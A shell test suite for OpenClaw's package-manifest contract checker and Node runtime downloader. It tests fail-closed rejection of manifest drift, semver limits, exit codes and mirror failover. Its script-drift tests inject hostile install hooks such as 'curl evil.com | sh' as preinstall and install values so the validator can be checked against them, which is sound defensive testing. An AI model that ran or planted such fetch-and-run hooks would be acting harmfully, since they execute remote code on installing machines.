#!/bin/sh
# ============================================================================
# OpenClaw 运行时与不可变清单契约行为测试
# 覆盖:
#   1. 合法清单通过校验
#   2. 版本/engines/script/依赖漂移拦截 (fail-closed)
#   3. engines.node 严格 semver 边界、前后缀拦截、空/不支持 range 校验
#   4. Helper CLI 退出码契约 (0=成功/帮助, 1=契约不满足, 2=CLI用法/输入格式错误)
#   5. get-vetted-scripts 脚本提取与物理存在性强校验
#   6. 自定义/latest 版本策略 (有 lifecycle 拒绝, 无 lifecycle 标记未验证)
#   7. lifecycle 脚本执行、postinstall 继承 npm_config_ignore_scripts、失败传播
#   8. mock 下载器行为: 备用源继续、最终缺失、错误哈希、错误架构/版本拦截
#   9. npm install / upgrade 参数契约 (--ignore-scripts --omit=optional)
#  10. 两架构 musl 资产名与工作流一致性
# ============================================================================
set -eu

SCRIPT_DIR=$(CDPATH= cd -- "$(dirname "$0")" && pwd)
REPO_ROOT=$(CDPATH= cd -- "$SCRIPT_DIR/.." && pwd)
CONTRACT_JS="$REPO_ROOT/root/usr/share/openclaw/openclaw-package-contract.js"
FIXTURE_PKG="$REPO_ROOT/tests/fixtures/openclaw-2026.9.1-package.json"
ENV_SCRIPT="$REPO_ROOT/root/usr/bin/openclaw-env"
BUILD_SCRIPT="$REPO_ROOT/scripts/build-node-musl.sh"
WORKFLOW="$REPO_ROOT/.github/workflows/build-node-musl.yml"

fail() {
	echo "FAIL: $1" >&2
	exit 1
}

NODE_BIN=""
for cand in node nodejs /opt/openclaw/node/bin/node; do
	if command -v "$cand" >/dev/null 2>&1; then NODE_BIN=$(command -v "$cand"); break; fi
	[ -x "$cand" ] && { NODE_BIN="$cand"; break; }
done

[ -n "$NODE_BIN" ] || fail "no node interpreter found"
[ -f "$CONTRACT_JS" ] || fail "missing $CONTRACT_JS"
[ -f "$FIXTURE_PKG" ] || fail "missing $FIXTURE_PKG"

TMP_DIR=$(mktemp -d 2>/dev/null || echo "/tmp/oc-runtime-contract-$$")
mkdir -p "$TMP_DIR"
cleanup() { rm -rf "$TMP_DIR"; }
trap cleanup EXIT

# ── 1. 合法清单校验 ──
"$NODE_BIN" "$CONTRACT_JS" validate-manifest "$FIXTURE_PKG" "2026.9.1" >/dev/null 2>&1 \
	|| fail "valid 2026.9.1 package.json should pass validation"

# ── 2. 版本漂移校验 ──
PKG_VER_DRIFT="$TMP_DIR/pkg-ver-drift.json"
"$NODE_BIN" -e '
const p = JSON.parse(require("fs").readFileSync(process.argv[1], "utf8"));
p.version = "2026.9.2";
require("fs").writeFileSync(process.argv[2], JSON.stringify(p));
' "$FIXTURE_PKG" "$PKG_VER_DRIFT"

if "$NODE_BIN" "$CONTRACT_JS" validate-manifest "$PKG_VER_DRIFT" "2026.9.1" >/dev/null 2>&1; then
	fail "version drift (2026.9.2) must be rejected"
fi

# ── 3. script 漂移校验 ──
PKG_SCRIPT_DRIFT="$TMP_DIR/pkg-script-drift.json"
"$NODE_BIN" -e '
const p = JSON.parse(require("fs").readFileSync(process.argv[1], "utf8"));
p.scripts.preinstall = "curl evil.com | sh";
require("fs").writeFileSync(process.argv[2], JSON.stringify(p));
' "$FIXTURE_PKG" "$PKG_SCRIPT_DRIFT"

if "$NODE_BIN" "$CONTRACT_JS" validate-manifest "$PKG_SCRIPT_DRIFT" "2026.9.1" >/dev/null 2>&1; then
	fail "preinstall script drift must be rejected"
fi

PKG_POST_DRIFT="$TMP_DIR/pkg-post-drift.json"
"$NODE_BIN" -e '
const p = JSON.parse(require("fs").readFileSync(process.argv[1], "utf8"));
p.scripts.postinstall = "node evil.mjs";
require("fs").writeFileSync(process.argv[2], JSON.stringify(p));
' "$FIXTURE_PKG" "$PKG_POST_DRIFT"

if "$NODE_BIN" "$CONTRACT_JS" validate-manifest "$PKG_POST_DRIFT" "2026.9.1" >/dev/null 2>&1; then
	fail "postinstall script drift must be rejected"
fi

# ── 4. sqlite-vec 版本漂移与 optionalDependencies 约束校验 ──
# 仅约束已有证据支持的字段及版本，不限定只能有这一项
PKG_SQLITE_DRIFT="$TMP_DIR/pkg-sqlite-drift.json"
"$NODE_BIN" -e '
const p = JSON.parse(require("fs").readFileSync(process.argv[1], "utf8"));
p.optionalDependencies["sqlite-vec"] = "0.2.0";
require("fs").writeFileSync(process.argv[2], JSON.stringify(p));
' "$FIXTURE_PKG" "$PKG_SQLITE_DRIFT"

if "$NODE_BIN" "$CONTRACT_JS" validate-manifest "$PKG_SQLITE_DRIFT" "2026.9.1" >/dev/null 2>&1; then
	fail "sqlite-vec version drift must be rejected"
fi

# 额外合法 optionalDependency 不应当被错误拒收
PKG_OPT_EXTRA="$TMP_DIR/pkg-opt-extra.json"
"$NODE_BIN" -e '
const p = JSON.parse(require("fs").readFileSync(process.argv[1], "utf8"));
p.optionalDependencies["other-optional"] = "1.2.3";
require("fs").writeFileSync(process.argv[2], JSON.stringify(p));
' "$FIXTURE_PKG" "$PKG_OPT_EXTRA"

"$NODE_BIN" "$CONTRACT_JS" validate-manifest "$PKG_OPT_EXTRA" "2026.9.1" >/dev/null 2>&1 \
	|| fail "extra optionalDependencies without sqlite-vec drift should be accepted"

# ── 4.1 2026.9.1 关键字段缺失校验 (fail-closed) ──
for mutate in \
	'delete p.name' \
	'delete p.version' \
	'delete p.bin' \
	'delete p.bin.openclaw' \
	'delete p.scripts' \
	'delete p.scripts.preinstall' \
	'delete p.scripts.postinstall' \
	'delete p.optionalDependencies' \
	'delete p.optionalDependencies["sqlite-vec"]' \
	'delete p.engines' \
	'delete p.engines.node'; do
	MUT_FILE="$TMP_DIR/pkg-missing-field.json"
	"$NODE_BIN" -e "
	const p = JSON.parse(require('fs').readFileSync(process.argv[1], 'utf8'));
	$mutate;
	require('fs').writeFileSync(process.argv[2], JSON.stringify(p));
	" "$FIXTURE_PKG" "$MUT_FILE"
	if "$NODE_BIN" "$CONTRACT_JS" validate-manifest "$MUT_FILE" "2026.9.1" >/dev/null 2>&1; then
		fail "manifest with missing field ($mutate) must be rejected"
	fi
done

# ── 4.2 2026.9.1 关键字段错误类型校验 (fail-closed) ──
for mutate in \
	'p.name = 123' \
	'p.version = 2026' \
	'p.bin = "openclaw.mjs"' \
	'p.bin = []' \
	'p.bin.openclaw = 123' \
	'p.scripts = []' \
	'p.scripts.preinstall = 123' \
	'p.scripts.postinstall = true' \
	'p.optionalDependencies = []' \
	'p.optionalDependencies["sqlite-vec"] = 123' \
	'p.engines = []' \
	'p.engines.node = 22'; do
	MUT_FILE="$TMP_DIR/pkg-type-error.json"
	"$NODE_BIN" -e "
	const p = JSON.parse(require('fs').readFileSync(process.argv[1], 'utf8'));
	$mutate;
	require('fs').writeFileSync(process.argv[2], JSON.stringify(p));
	" "$FIXTURE_PKG" "$MUT_FILE"
	if "$NODE_BIN" "$CONTRACT_JS" validate-manifest "$MUT_FILE" "2026.9.1" >/dev/null 2>&1; then
		fail "manifest with invalid field type ($mutate) must be rejected"
	fi
done

# ── 4.3 2026.9.1 关键字段值漂移与额外/空值 lifecycle 及结构漂移校验 (fail-closed) ──
for mutate in \
	'p.name = "openclaw-evil"' \
	'p.version = "2026.9.2"' \
	'p.bin.openclaw = "other.mjs"' \
	'p.bin.extra = "extra.mjs"' \
	'p.scripts.install = "curl evil.com | sh"' \
	'p.scripts.prepare = "node evil.js"' \
	'p.scripts.install = ""' \
	'p.scripts.preinstall = ""' \
	'p.scripts.postinstall = "   "' \
	'p.engines.node = ">=22.0.0"' \
	'p.engines.node = ">=22.22.3 <23 || >=24.15.0 <25 || >=25.9.0 "'; do
	MUT_FILE="$TMP_DIR/pkg-val-drift.json"
	"$NODE_BIN" -e "
	const p = JSON.parse(require('fs').readFileSync(process.argv[1], 'utf8'));
	$mutate;
	require('fs').writeFileSync(process.argv[2], JSON.stringify(p));
	" "$FIXTURE_PKG" "$MUT_FILE"
	if "$NODE_BIN" "$CONTRACT_JS" validate-manifest "$MUT_FILE" "2026.9.1" >/dev/null 2>&1; then
		fail "manifest with value drift, structural drift, or extra/empty lifecycle ($mutate) must be rejected"
	fi
done

# ── 5. engines.node 范围语义与严格 semver 边界比对校验 ──
# 契约规则: ">=22.22.3 <23 || >=24.15.0 <25 || >=25.9.0"

# 合法版本
"$NODE_BIN" "$CONTRACT_JS" validate-node-version "22.23.2" >/dev/null 2>&1 || fail "Node 22.23.2 must be valid"
"$NODE_BIN" "$CONTRACT_JS" validate-node-version "22.22.3" >/dev/null 2>&1 || fail "Node 22.22.3 must be valid"
"$NODE_BIN" "$CONTRACT_JS" validate-node-version "24.15.0" >/dev/null 2>&1 || fail "Node 24.15.0 must be valid"
"$NODE_BIN" "$CONTRACT_JS" validate-node-version "25.9.0" >/dev/null 2>&1 || fail "Node 25.9.0 must be valid"

# 非法版本: 低于最低要求 (退出码 1)
set +e
"$NODE_BIN" "$CONTRACT_JS" validate-node-version "22.19.0" >/dev/null 2>&1
RC_LOW=$?
"$NODE_BIN" "$CONTRACT_JS" validate-node-version "22.22.2" >/dev/null 2>&1
RC_PATCH=$?
"$NODE_BIN" "$CONTRACT_JS" validate-node-version "23.0.0" >/dev/null 2>&1
RC_23=$?
"$NODE_BIN" "$CONTRACT_JS" validate-node-version "24.14.0" >/dev/null 2>&1
RC_24=$?
set -e
[ "$RC_LOW" -eq 1 ] || fail "Node 22.19.0 must exit 1 (contract unsatisfied)"
[ "$RC_PATCH" -eq 1 ] || fail "Node 22.22.2 must exit 1 (contract unsatisfied)"
[ "$RC_23" -eq 1 ] || fail "Node 23.0.0 must exit 1 (contract unsatisfied)"
[ "$RC_24" -eq 1 ] || fail "Node 24.14.0 must exit 1 (contract unsatisfied)"

# 非法格式/前后缀 semver (退出码 2)
set +e
"$NODE_BIN" "$CONTRACT_JS" validate-node-version "22.23.2-alpha" >/dev/null 2>&1
RC_PRE=$?
"$NODE_BIN" "$CONTRACT_JS" validate-node-version "22.23.2foo" >/dev/null 2>&1
RC_SUF=$?
"$NODE_BIN" "$CONTRACT_JS" validate-node-version "v22.23.2.1" >/dev/null 2>&1
RC_FOUR=$?
"$NODE_BIN" "$CONTRACT_JS" validate-node-version "22.23" >/dev/null 2>&1
RC_TWO=$?
set -e
[ "$RC_PRE" -eq 2 ] || fail "semver with prerelease suffix must exit 2 (input format error)"
[ "$RC_SUF" -eq 2 ] || fail "semver with trailing suffix must exit 2 (input format error)"
[ "$RC_FOUR" -eq 2 ] || fail "four-segment version must exit 2 (input format error)"
[ "$RC_TWO" -eq 2 ] || fail "two-segment version must exit 2 (input format error)"

# 空或不支持的 range (退出码 2)
set +e
"$NODE_BIN" "$CONTRACT_JS" validate-node-version "22.23.2" "   " >/dev/null 2>&1
RC_EMPTY_RANGE=$?
"$NODE_BIN" "$CONTRACT_JS" validate-node-version "22.23.2" "^22.0.0" >/dev/null 2>&1
RC_UNSUPPORTED_RANGE=$?
set -e
[ "$RC_EMPTY_RANGE" -eq 2 ] || fail "empty range must exit 2"
[ "$RC_UNSUPPORTED_RANGE" -eq 2 ] || fail "unsupported range operator must exit 2"

# ── 6. Helper CLI 退出码约定校验 ──
# 0=成功或帮助，1=契约不满足，2=CLI 用法或输入格式错误
set +e
"$NODE_BIN" "$CONTRACT_JS" --help >/dev/null 2>&1
RC_HELP=$?
"$NODE_BIN" "$CONTRACT_JS" >/dev/null 2>&1
RC_NO_CMD=$?
"$NODE_BIN" "$CONTRACT_JS" unknown-subcommand >/dev/null 2>&1
RC_UNK_CMD=$?
"$NODE_BIN" "$CONTRACT_JS" validate-manifest >/dev/null 2>&1
RC_MISSING_ARGS=$?
"$NODE_BIN" "$CONTRACT_JS" validate-manifest "$FIXTURE_PKG" "2026.9.1" "redundant-arg" >/dev/null 2>&1
RC_EXTRA_ARGS=$?
"$NODE_BIN" "$CONTRACT_JS" validate-manifest "$TMP_DIR/non-existent.json" "2026.9.1" >/dev/null 2>&1
RC_NON_EXIST_FILE=$?
set -e
[ "$RC_HELP" -eq 0 ] || fail "--help must exit 0"
[ "$RC_NO_CMD" -eq 2 ] || fail "no command must exit 2"
[ "$RC_UNK_CMD" -eq 2 ] || fail "unknown command must exit 2"
[ "$RC_MISSING_ARGS" -eq 2 ] || fail "missing arguments must exit 2"
[ "$RC_EXTRA_ARGS" -eq 2 ] || fail "extra arguments must exit 2"
[ "$RC_NON_EXIST_FILE" -eq 2 ] || fail "non-existent manifest file must exit 2"

# ── 7. get-vetted-scripts 脚本提取与白名单文件物理存在性强校验 ──
MOCK_INSTALL_PKG_DIR="$TMP_DIR/vetted-scripts-test"
mkdir -p "$MOCK_INSTALL_PKG_DIR/scripts"
cp "$FIXTURE_PKG" "$MOCK_INSTALL_PKG_DIR/package.json"

# 文件尚未建立时必须失败 (退出码 1)
set +e
"$NODE_BIN" "$CONTRACT_JS" get-vetted-scripts "$MOCK_INSTALL_PKG_DIR/package.json" "2026.9.1" >/dev/null 2>&1
RC_MISSING_SCRIPTS=$?
set -e
[ "$RC_MISSING_SCRIPTS" -eq 1 ] || fail "get-vetted-scripts must exit 1 when whitelisted files are missing on disk"

# 建立物理脚本文件后必须通过并正确列出
touch "$MOCK_INSTALL_PKG_DIR/scripts/preinstall-package-manager-warning.mjs"
touch "$MOCK_INSTALL_PKG_DIR/scripts/postinstall-bundled-plugins.mjs"

VETTED_OUT=$("$NODE_BIN" "$CONTRACT_JS" get-vetted-scripts "$MOCK_INSTALL_PKG_DIR/package.json" "2026.9.1")
echo "$VETTED_OUT" | grep -q "scripts/preinstall-package-manager-warning.mjs" || fail "missing preinstall script in get-vetted-scripts output"
echo "$VETTED_OUT" | grep -q "scripts/postinstall-bundled-plugins.mjs" || fail "missing postinstall script in get-vetted-scripts output"

# ── 8. 自定义/latest 版本策略: 拒绝未知 lifecycle，标记未验证 ──
PKG_CUSTOM_WITH_LIFECYCLE="$TMP_DIR/pkg-custom-lifecycle.json"
"$NODE_BIN" -e '
const p = JSON.parse(require("fs").readFileSync(process.argv[1], "utf8"));
p.version = "2026.9.9";
p.scripts = { preinstall: "node some-script.js" };
require("fs").writeFileSync(process.argv[2], JSON.stringify(p));
' "$FIXTURE_PKG" "$PKG_CUSTOM_WITH_LIFECYCLE"

if "$NODE_BIN" "$CONTRACT_JS" validate-manifest "$PKG_CUSTOM_WITH_LIFECYCLE" "2026.9.9" >/dev/null 2>&1; then
	fail "custom version with unknown lifecycle script must be rejected (fail-closed)"
fi

PKG_CUSTOM_NO_LIFECYCLE="$TMP_DIR/pkg-custom-no-lifecycle.json"
"$NODE_BIN" -e '
const p = JSON.parse(require("fs").readFileSync(process.argv[1], "utf8"));
p.version = "2026.9.9";
p.scripts = {};
p.engines = { node: ">=" + process.versions.node };
require("fs").writeFileSync(process.argv[2], JSON.stringify(p));
' "$FIXTURE_PKG" "$PKG_CUSTOM_NO_LIFECYCLE"

CUSTOM_VAL_OUT=$("$NODE_BIN" "$CONTRACT_JS" validate-manifest "$PKG_CUSTOM_NO_LIFECYCLE" "2026.9.9" 2>&1)
echo "$CUSTOM_VAL_OUT" | grep -q "未验证" || fail "custom version without lifecycle must be explicitly marked unverified"

# 8.0 自定义/latest 版本包含常规 scripts (如 test, start, prepush, build) 但不含 npm 安装期 lifecycle 时必须正常放行 (标记未验证)
PKG_CUSTOM_WITH_REGULAR_SCRIPTS="$TMP_DIR/pkg-custom-regular-scripts.json"
"$NODE_BIN" -e '
const p = JSON.parse(require("fs").readFileSync(process.argv[1], "utf8"));
p.version = "2026.9.9";
p.scripts = {
  test: "jest",
  start: "node dist/index.js",
  prepush: "npm run lint",
  build: "vite build"
};
p.engines = { node: ">=" + process.versions.node };
require("fs").writeFileSync(process.argv[2], JSON.stringify(p));
' "$FIXTURE_PKG" "$PKG_CUSTOM_WITH_REGULAR_SCRIPTS"

REGULAR_VAL_OUT=$("$NODE_BIN" "$CONTRACT_JS" validate-manifest "$PKG_CUSTOM_WITH_REGULAR_SCRIPTS" "2026.9.9" 2>&1) \
	|| fail "custom version with regular scripts (test, start, prepush) should be allowed"
echo "$REGULAR_VAL_OUT" | grep -q "未验证" || fail "custom version with regular scripts must be marked unverified"

# 8.0.1 真实 npm 安装期钩子 (如 prepare, prepack, postpack, install) 在自定义/latest 版本中必须被拦截 (fail-closed)
for hook in prepare prepack postpack install; do
	PKG_HOOK_TEST="$TMP_DIR/pkg-hook-${hook}.json"
	"$NODE_BIN" -e '
	const p = JSON.parse(require("fs").readFileSync(process.argv[1], "utf8"));
	p.version = "2026.9.9";
	p.scripts = {};
	p.scripts[process.argv[3]] = "echo hook";
	require("fs").writeFileSync(process.argv[2], JSON.stringify(p));
	' "$FIXTURE_PKG" "$PKG_HOOK_TEST" "$hook"

	if "$NODE_BIN" "$CONTRACT_JS" validate-manifest "$PKG_HOOK_TEST" "2026.9.9" >/dev/null 2>&1; then
		fail "custom version with lifecycle hook $hook must be rejected (fail-closed)"
	fi
done

# 8.1 自定义/latest 版本 engines.node 与当前运行时不兼容时必须拒绝 (fail-closed)
PKG_CUSTOM_INCOMPAT_ENGINES="$TMP_DIR/pkg-custom-incompat-engines.json"
"$NODE_BIN" -e '
const p = JSON.parse(require("fs").readFileSync(process.argv[1], "utf8"));
p.version = "2026.9.9";
p.scripts = {};
p.engines = { node: ">=99.0.0" };
require("fs").writeFileSync(process.argv[2], JSON.stringify(p));
' "$FIXTURE_PKG" "$PKG_CUSTOM_INCOMPAT_ENGINES"

if "$NODE_BIN" "$CONTRACT_JS" validate-manifest "$PKG_CUSTOM_INCOMPAT_ENGINES" "2026.9.9" >/dev/null 2>&1; then
	fail "custom version with incompatible engines.node must be rejected (fail-closed)"
fi

# 8.2 自定义/latest 版本 engines.node 语法非法时必须拒绝
PKG_CUSTOM_BAD_ENGINES="$TMP_DIR/pkg-custom-bad-engines.json"
"$NODE_BIN" -e '
const p = JSON.parse(require("fs").readFileSync(process.argv[1], "utf8"));
p.version = "2026.9.9";
p.scripts = {};
p.engines = { node: "^^22.0.0" };
require("fs").writeFileSync(process.argv[2], JSON.stringify(p));
' "$FIXTURE_PKG" "$PKG_CUSTOM_BAD_ENGINES"

if "$NODE_BIN" "$CONTRACT_JS" validate-manifest "$PKG_CUSTOM_BAD_ENGINES" "2026.9.9" >/dev/null 2>&1; then
	fail "custom version with invalid engines.node syntax must be rejected"
fi

# 8.3 自定义/latest 版本含空值 lifecycle 时必须拒绝 (fail-closed)
PKG_CUSTOM_EMPTY_LIFECYCLE="$TMP_DIR/pkg-custom-empty-lifecycle.json"
"$NODE_BIN" -e '
const p = JSON.parse(require("fs").readFileSync(process.argv[1], "utf8"));
p.version = "2026.9.9";
p.scripts = { preinstall: "" };
p.engines = { node: ">=" + process.versions.node };
require("fs").writeFileSync(process.argv[2], JSON.stringify(p));
' "$FIXTURE_PKG" "$PKG_CUSTOM_EMPTY_LIFECYCLE"

if "$NODE_BIN" "$CONTRACT_JS" validate-manifest "$PKG_CUSTOM_EMPTY_LIFECYCLE" "2026.9.9" >/dev/null 2>&1; then
	fail "custom version with empty lifecycle script must be rejected (fail-closed)"
fi

# 8.4 自定义版本实际版本与目标版本不一致时必须拒绝 (fail-closed)
PKG_CUSTOM_VER_MISMATCH="$TMP_DIR/pkg-custom-ver-mismatch.json"
"$NODE_BIN" -e '
const p = JSON.parse(require("fs").readFileSync(process.argv[1], "utf8"));
p.version = "2026.9.8";
p.scripts = {};
p.engines = { node: ">=" + process.versions.node };
require("fs").writeFileSync(process.argv[2], JSON.stringify(p));
' "$FIXTURE_PKG" "$PKG_CUSTOM_VER_MISMATCH"

if "$NODE_BIN" "$CONTRACT_JS" validate-manifest "$PKG_CUSTOM_VER_MISMATCH" "2026.9.9" >/dev/null 2>&1; then
	fail "custom version with version mismatch must be rejected (fail-closed)"
fi

# ── 9. lifecycle 失败传播与 postinstall 环境变量行为校验 ──
MOCK_LIFECYCLE_DIR="$TMP_DIR/mock-lifecycle"
mkdir -p "$MOCK_LIFECYCLE_DIR/scripts"
cp "$FIXTURE_PKG" "$MOCK_LIFECYCLE_DIR/package.json"

# 写入 preinstall 失败脚本
cat > "$MOCK_LIFECYCLE_DIR/scripts/preinstall-package-manager-warning.mjs" <<'EOF'
process.exit(42);
EOF
cat > "$MOCK_LIFECYCLE_DIR/scripts/postinstall-bundled-plugins.mjs" <<'EOF'
process.exit(0);
EOF

HARNESS_LIFECYCLE="$TMP_DIR/test-lifecycle.sh"
cat > "$HARNESS_LIFECYCLE" <<EOF
NODE_BIN="$NODE_BIN"
OC_PACKAGE_CONTRACT="$CONTRACT_JS"
log_info() { :; }
log_warn() { :; }
log_error() { :; }
EOF
awk '/^execute_openclaw_lifecycle\(\)/,/^\}$/' "$ENV_SCRIPT" >> "$HARNESS_LIFECYCLE"
cat >> "$HARNESS_LIFECYCLE" <<EOF
execute_openclaw_lifecycle "$MOCK_LIFECYCLE_DIR" "2026.9.1"
EOF

set +e
sh "$HARNESS_LIFECYCLE" >/dev/null 2>&1
RC_PRE_FAIL=$?
set -e
[ "$RC_PRE_FAIL" -ne 0 ] || fail "preinstall script failure must propagate non-zero exit code"

# 测试 postinstall 失败传播并验证 npm_config_ignore_scripts 继承
cat > "$MOCK_LIFECYCLE_DIR/scripts/preinstall-package-manager-warning.mjs" <<'EOF'
process.exit(0);
EOF
cat > "$MOCK_LIFECYCLE_DIR/scripts/postinstall-bundled-plugins.mjs" <<'EOF'
if (process.env.npm_config_ignore_scripts !== "true") {
	process.exit(99);
}
process.exit(43);
EOF

set +e
sh "$HARNESS_LIFECYCLE" >/dev/null 2>&1
RC_POST_FAIL=$?
set -e
[ "$RC_POST_FAIL" -ne 0 ] || fail "postinstall script failure must propagate non-zero exit code"

# 测试成功执行与 npm_config_ignore_scripts 环境变量确认
cat > "$MOCK_LIFECYCLE_DIR/scripts/postinstall-bundled-plugins.mjs" <<'EOF'
if (process.env.npm_config_ignore_scripts !== "true") {
	process.exit(99);
}
process.exit(0);
EOF

sh "$HARNESS_LIFECYCLE" >/dev/null 2>&1 || fail "postinstall with npm_config_ignore_scripts=true must succeed"

# ── 10. mock 下载器行为测试 (备用源继续、最终缺失、错误哈希、错误架构/版本) ──
MOCK_TEST_ROOT="$TMP_DIR/mock-downloader-test"
mkdir -p "$MOCK_TEST_ROOT/bin"
MOCK_ENV_DIR="$MOCK_TEST_ROOT/env"
mkdir -p "$MOCK_ENV_DIR"

# 制作合法的模拟 tarball (>5MB 以通过压缩包完整性门禁)
MOCK_ARCH="linux-x64"
MOCK_VER="22.23.2"
MOCK_PKG_NAME="node-v${MOCK_VER}-${MOCK_ARCH}-musl"
MOCK_BUILD_DIR="$MOCK_TEST_ROOT/build/${MOCK_PKG_NAME}"
mkdir -p "${MOCK_BUILD_DIR}/bin" "${MOCK_BUILD_DIR}/share/icu"
cat > "${MOCK_BUILD_DIR}/bin/node" <<'EOF'
#!/bin/sh
case "$1" in
	--version) echo "v22.23.2" ;;
	-p)
		if [ "$2" = "process.arch" ]; then echo "x64"; else echo ""; fi
		;;
	-e)
		exit 0
		;;
	*)
		exec node "$@"
		;;
esac
EOF
chmod +x "${MOCK_BUILD_DIR}/bin/node"
dd if=/dev/urandom of="${MOCK_BUILD_DIR}/share/icu/dummy.dat" bs=1024 count=5100 2>/dev/null

(cd "$MOCK_TEST_ROOT/build" && tar -cf - "${MOCK_PKG_NAME}" | xz > "$MOCK_TEST_ROOT/valid-node.tar.xz")
VALID_HASH=$("$NODE_BIN" -e 'console.log(require("crypto").createHash("sha256").update(require("fs").readFileSync(process.argv[1])).digest("hex"))' "$MOCK_TEST_ROOT/valid-node.tar.xz")

# (10.1) 备用源继续测试: 主源 404，备用源返回有效 tarball 及 sha256 成功完成
MOCK_CURL_FAILOVER="$MOCK_TEST_ROOT/bin/curl"
cat > "$MOCK_CURL_FAILOVER" <<EOF
#!/bin/sh
outfile=""
url=""
while [ \$# -gt 0 ]; do
	case "\$1" in
		-o|-O) outfile="\$2"; shift 2 ;;
		http://*|https://*) url="\$1"; shift 1 ;;
		*) shift 1 ;;
	esac
done

case "\$url" in
	*unofficial-builds*)
		exit 22
		;;
	*npmmirror*SHASUMS256.txt*)
		echo "${VALID_HASH}  ${MOCK_PKG_NAME}.tar.xz" > "\$outfile"
		exit 0
		;;
	*npmmirror*)
		cp "$MOCK_TEST_ROOT/valid-node.tar.xz" "\$outfile"
		exit 0
		;;
	*)
		exit 1
		;;
esac
EOF
chmod +x "$MOCK_CURL_FAILOVER"
ln -sf "$MOCK_CURL_FAILOVER" "$MOCK_TEST_ROOT/bin/wget"

HARNESS_DOWNLOADER="$MOCK_TEST_ROOT/test-download.sh"
cat > "$HARNESS_DOWNLOADER" <<EOF
#!/bin/sh
set -e
export PATH="$MOCK_TEST_ROOT/bin:\$PATH"
OC_BASE_PATH="$MOCK_ENV_DIR"
NODE_BASE="$MOCK_ENV_DIR/node"
NODE_BIN="\$NODE_BASE/bin/node"
OC_PACKAGE_CONTRACT="$CONTRACT_JS"
OC_NODE_MIN_VERSION="22.22.3"
log_info() { :; }
log_warn() { :; }
log_error() { :; }
ensure_mkdir() { mkdir -p "\$1"; }
detect_libc() { echo "musl"; }
detect_arch() { echo "linux-x64"; }
NODE_MUSL_MIRROR="https://unofficial-builds.nodejs.org/download/release"
NODE_MIRROR_CN="https://npmmirror.com/mirrors/node"
NODE_SELF_HOST="https://github.com/10000ge10000/luci-app-openclaw/releases/download/node-bins"
find_oc_entry() { echo ""; }
assert_node_runtime() { :; }
EOF
awk '/^oc_sum256\(\)/,/^download_node\(\)/' "$ENV_SCRIPT" | sed '$d' >> "$HARNESS_DOWNLOADER"
awk '/^download_node\(\)/,/^install_pnpm\(\)/' "$ENV_SCRIPT" | sed '$d' >> "$HARNESS_DOWNLOADER"
cat >> "$HARNESS_DOWNLOADER" <<EOF
download_node "22.23.2"
EOF

sh "$HARNESS_DOWNLOADER" >/dev/null 2>&1 || fail "downloader should failover to backup mirror and succeed"
[ -x "$MOCK_ENV_DIR/node/bin/node" ] || fail "failover download should install node successfully"

# (10.2) 最终缺失测试: 所有源均 404 / 失败，必须 fail-closed 退出码非零
rm -rf "$MOCK_ENV_DIR/node"
cat > "$MOCK_CURL_FAILOVER" <<'EOF'
#!/bin/sh
exit 22
EOF
set +e
sh "$HARNESS_DOWNLOADER" >/dev/null 2>&1
RC_EXHAUSTED=$?
set -e
[ "$RC_EXHAUSTED" -ne 0 ] || fail "downloader must fail when all candidate mirrors fail"

# (10.3) 错误哈希测试: 下载文件哈希不匹配时淘汰并最终失败
rm -rf "$MOCK_ENV_DIR/node"
cat > "$MOCK_CURL_FAILOVER" <<EOF
#!/bin/sh
outfile=""
url=""
while [ \$# -gt 0 ]; do
	case "\$1" in
		-o|-O) outfile="\$2"; shift 2 ;;
		http://*|https://*) url="\$1"; shift 1 ;;
		*) shift 1 ;;
	esac
done
case "\$url" in
	*SHASUMS256.txt*)
		echo "badhash00000000000000000000000000000000000000000000000000000000  ${MOCK_PKG_NAME}.tar.xz" > "\$outfile"
		exit 0
		;;
	*)
		cp "$MOCK_TEST_ROOT/valid-node.tar.xz" "\$outfile"
		exit 0
		;;
esac
EOF
set +e
sh "$HARNESS_DOWNLOADER" >/dev/null 2>&1
RC_BAD_HASH=$?
set -e
[ "$RC_BAD_HASH" -ne 0 ] || fail "downloader must reject tarball on sha256 mismatch"

# (10.4) 错误架构测试: 解压出的 node process.arch 不符时必须失败
MOCK_WRONG_ARCH_DIR="$MOCK_TEST_ROOT/build/wrong-arch/${MOCK_PKG_NAME}"
mkdir -p "${MOCK_WRONG_ARCH_DIR}/bin" "${MOCK_WRONG_ARCH_DIR}/share/icu"
cat > "${MOCK_WRONG_ARCH_DIR}/bin/node" <<'EOF'
#!/bin/sh
case "$1" in
	--version) echo "v22.23.2" ;;
	-p)
		if [ "$2" = "process.arch" ]; then echo "arm64"; else echo ""; fi
		;;
	*) exit 0 ;;
esac
EOF
chmod +x "${MOCK_WRONG_ARCH_DIR}/bin/node"
dd if=/dev/urandom of="${MOCK_WRONG_ARCH_DIR}/share/icu/dummy.dat" bs=1024 count=5100 2>/dev/null
(cd "$MOCK_TEST_ROOT/build/wrong-arch" && tar -cf - "${MOCK_PKG_NAME}" | xz > "$MOCK_TEST_ROOT/wrong-arch-node.tar.xz")
WRONG_ARCH_HASH=$("$NODE_BIN" -e 'console.log(require("crypto").createHash("sha256").update(require("fs").readFileSync(process.argv[1])).digest("hex"))' "$MOCK_TEST_ROOT/wrong-arch-node.tar.xz")

rm -rf "$MOCK_ENV_DIR/node"
cat > "$MOCK_CURL_FAILOVER" <<EOF
#!/bin/sh
outfile=""
url=""
while [ \$# -gt 0 ]; do
	case "\$1" in
		-o|-O) outfile="\$2"; shift 2 ;;
		http://*|https://*) url="\$1"; shift 1 ;;
		*) shift 1 ;;
	esac
done
case "\$url" in
	*SHASUMS256.txt*)
		echo "${WRONG_ARCH_HASH}  ${MOCK_PKG_NAME}.tar.xz" > "\$outfile"
		exit 0
		;;
	*)
		cp "$MOCK_TEST_ROOT/wrong-arch-node.tar.xz" "\$outfile"
		exit 0
		;;
esac
EOF
set +e
sh "$HARNESS_DOWNLOADER" >/dev/null 2>&1
RC_WRONG_ARCH=$?
set -e
[ "$RC_WRONG_ARCH" -ne 0 ] || fail "downloader must reject node binary with mismatched process.arch"

# ── 11. 安装/升级 npm 参数契约、预检回滚与状态保持行为测试 ──
grep -q -- "--ignore-scripts --omit=optional" "$ENV_SCRIPT" || fail "openclaw-env must enforce both --ignore-scripts and --omit=optional"

MOCK_NPM_DIR="$TMP_DIR/mock-npm-test"
mkdir -p "$MOCK_NPM_DIR/bin"
MOCK_NPM_ARGS="$MOCK_NPM_DIR/npm-args.txt"
MOCK_NPM_EXIT_CODE="$MOCK_NPM_DIR/npm-rc"
echo "0" > "$MOCK_NPM_EXIT_CODE"

